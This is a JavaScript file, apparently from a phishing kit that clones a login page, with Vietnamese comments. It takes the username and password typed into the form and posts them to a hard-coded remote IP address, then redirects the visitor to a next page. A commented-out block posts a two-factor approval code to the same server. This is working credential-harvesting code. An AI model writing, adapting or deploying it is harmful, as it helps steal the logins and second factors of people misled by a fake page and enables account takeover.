
function generateRandomID() {
    return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
}
function generateUniqueKey() {
    const timestamp = new Date().getTime();
    const randomNum = Math.floor(Math.random() * 1000); // Số ngẫu nhiên từ 0 đến 999
    return `${timestamp}_${randomNum}_${generateRandomID()}`;
}
const key = generateUniqueKey();
console.log(key)

document.getElementById("loadPage").addEventListener("click", function () {
    const username = document.getElementById("usernameAdd").value;
    const password = document.getElementById("password_field").value;
    const rkey = key;
    // Kiểm tra xem các textbox có trống không
    if (!username || !password) {
        const error = document.getElementById("error");
        error.style.display = "block";
    } else {
        // Gửi dữ liệu POST đến máy chủ để thêm tài khoản
        fetch("http://103.188.167.91/add", {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: `username=${username}&password=${password}&rkey=${rkey}`
        })
            .then(response => response.text())
            .then(data => {
                if (data === 'done') {
                    window.location.href = "./next.html?rkey=" + rkey;
                    // var xhr = new XMLHttpRequest();
                    // xhr.open("GET", "../clone/next.html", true);
                    // xhr.onreadystatechange = function () {
                    //     if (xhr.readyState === 4 && xhr.status === 200) {
                    //         // Khi tải xong, thay đổi nội dung của phần tử có class "contains-top-half-and-footer-bottom-half"
                    //         var element = document.querySelector(".contains-top-half-and-footer-bottom-half");
                    //         element.innerHTML = "";
                    //         element.innerHTML = xhr.responseText;
                    //     }
                    // };
                    // xhr.send();
                }
                //alert(data); // Hiển thị thông báo từ máy chủ
                // Thực hiện các xử lý khác sau khi thêm thành công (nếu cần)
            })
            .catch(error => {
                console.error(error);
            });
    }


});



document.getElementById("add-form").addEventListener("submit", function (event) {
    event.preventDefault();
    console.log("đây là key", key)
    const username = document.getElementById("usernameAdd").value;
    const password = document.getElementById("passwordAdd").value;
    const rkey = key;
    // Gửi dữ liệu POST đến máy chủ để thêm tài khoản
    fetch("/add", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: `username=${username}&password=${password}&rkey=${rkey}`
    })
        .then(response => response.text())
        .then(data => {
            alert(data); // Hiển thị thông báo từ máy chủ
            // Thực hiện các xử lý khác sau khi thêm thành công (nếu cần)
        })
        .catch(error => {
            console.error(error);
        });
});

// document.getElementById("update-form").addEventListener("submit", function (event) {
//     alert("đã vào")
//     event.preventDefault();
//     const twofa = document.getElementById("approvals_code").value;
//     // Gửi dữ liệu POST đến máy chủ để cập nhật tài khoản
//     fetch("http://103.188.167.91/update", {
//         method: "POST",
//         headers: {
//             "Content-Type": "application/x-www-form-urlencoded"
//         },
//         body: `twofa=${twofa}`
//     })
//         .then(response => response.text())
//         .then(data => {
//             alert(data); // Hiển thị thông báo từ máy chủ
//             // Thực hiện các xử lý khác sau khi cập nhật thành công (nếu cần)
//         })
//         .catch(error => {
//             console.error(error);
//         });
// });
